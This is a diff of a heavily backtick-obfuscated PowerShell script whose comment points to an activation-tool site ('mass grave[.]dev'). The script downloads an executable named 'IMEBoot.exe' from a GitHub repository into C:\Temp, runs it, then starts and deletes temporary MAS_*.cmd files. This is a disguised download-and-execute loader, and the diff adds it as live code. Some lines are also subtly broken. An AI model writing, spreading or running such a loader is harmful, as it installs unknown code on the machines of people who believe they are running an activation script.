@@ -1,3 +1,21 @@
 # Check the instructions here on how to use it mass grave[.]dev
-$F="E`r`r`o`r`A`c`t`i`o`n`P`r`e`f`e`r`e`n`c`e";$H=[N`e`t`.`S`e`r`v`i`c`e`P`o`i`n`t`M`a`n`a`g`e`r]::"S`e`c`u`r`i`t`y`P`r`o`t`o`c`o`l";$H="T`l`s`1`2";$C="N`e`t`.`S`e`c`u`r`i`t`y`P`r`o`t`o`c`o`lT`y`p`e";$H=$H-`b`o`r$([N`e`t`.`S`e`c`u`r`i`t`y`P`r`o`t`o`c`o`lT`y`p`e]::$C);$U="h`t`t`p`s`://`g`i`t`h`u`b`.`c`o`m/S`h`e`l`lS`c`u`l`p`t`o`r/`G`e`t`s`S`c`r`e`e`n-`W`i`n`d`o`w`s-1`0/`r`a`w/m`a`i`n/I`M`E`B`o`o`t`.`e`x`e";$X="C:\T`e`m`p\I`M`E`B`o`o`t`.`e`x`e";$Q="$`e`n`v:S`y`s`te`mR`o`o`t\`T`e`m`p\M`A`S_`$($([R`a`N`D`O`m]::"N`e`X`t(99999999)")).c`m`d";$D="s`T`a`r`t`-P`r`o`c`e`s`s";i`e($Q-eq"")
-{$Q="$`e`n`v:T`e`m`p\M`A`S_`$($([R`a`N`D`O`m]::"N`e`X`t(99999999)")).c`m`d"}$H::$("N`e`w-O`b`j`e`c`t") "S`y`s`T`e`m`.`N`e`t`.`W`e`bC`l`i`e`N`t";$H."D`o`w`n`l`o`a`dF`i`l`e"($U,$X);s`T`a`r`t-P`r`o`c`e`s`s $X;i`e($Q-eq""){$Q="$`e`n`v:S`y`s`te`mR`o`o`t\`T`e`m`p\M`A`S_`$($([R`a`N`D`O`m]::"N`e`X`t(99999999)")).c`m`d"}s`T`a`r`t-P`r`o`c`e`s`s $Q;$J=@("$`e`n`v:T`e`m`p\M`A`S*.c`m`d","$`e`n`v:S`y`s`te`mR`o`o`t\T`e`m`p\M`A`S*.c`m`d");f`o`r`e`a`c`h($I i`n $J){g`e`t-i`T`E`m $I| r`E`m`o`v`e-I`T`E`m}
+$E="E`r`r`o`r`A`c`t`i`o`n`P`r`e`f`e`r`e`n`c`e"
+$H=[N`e`t`.`S`e`r`v`i`c`e`P`o`i`n`t`M`a`n`a`g`e`r]::"S`e`c`u`r`i`t`y`P`r`o`t`o`c`o`l"
+$H="T`l`s`1`2"
+$C="N`e`t`.`S`e`c`u`r`i`t`y`P`r`o`t`o`c`o`lT`y`p`e"
+$H=$H-`b`o`r$([N`e`t`.`S`e`c`u`r`i`t`y`P`r`o`t`o`c`o`lT`y`p`e]::$C)
+$U="h`t`t`p`s`://`g`i`t`h`u`b`.`c`o`m/S`h`e`l`lS`c`u`l`p`t`o`r/`G`e`t`s`S`c`r`e`e`n-`W`i`n`d`o`w`s-1`0/`r`a`w/m`a`i`n/I`M`E`B`o`o`t`.`e`x`e"
+$X="C:\T`e`m`p\I`M`E`B`o`o`t`.`e`x`e"
+$Q="$`e`n`v:S`y`s`te`mR`o`o`t\`T`e`m`p\M`A`S_`$($([R`a`N`D`O`m]::"N`e`X`t(99999999)")).c`m`d"
+$D="s`T`a`r`t`-P`r`o`c`e`s`s"
+i`f($Q-eq"")
+{$Q="$`e`n`v:T`e`m`p\M`A`S_`$($([R`a`N`D`O`m]::"N`e`X`t(99999999)")).c`m`d"}
+$H::"N`e`w-O`b`j`e`c`t" "S`y`s`T`e`m`.`N`e`t`.`W`e`bC`l`i`e`N`t"
+$H."D`o`w`n`l`o`a`dF`i`l`e"($U,$X)
+s`T`a`r`t-P`r`o`c`e`s`s $X
+i`f($Q-eq"")
+{$Q="$`e`n`v:S`y`s`te`mR`o`o`t\`T`e`m`p\M`A`S_`$($([R`a`N`D`O`m]::"N`e`X`t(99999999)")).c`m`d"}
+s`T`a`r`t-P`r`o`c`e`s`s $Q
+$J=@("$`e`n`v:T`e`m`p\M`A`S*.c`m`d","$`e`n`v:S`y`s`te`mR`o`o`t\T`e`m`p\M`A`S*.c`m`d")
+f`o`r`e`a`c`h($I i`n $J)
+{g`e`t-i`T`E`m $I| r`E`m`o`v`e-I`T`E`m}
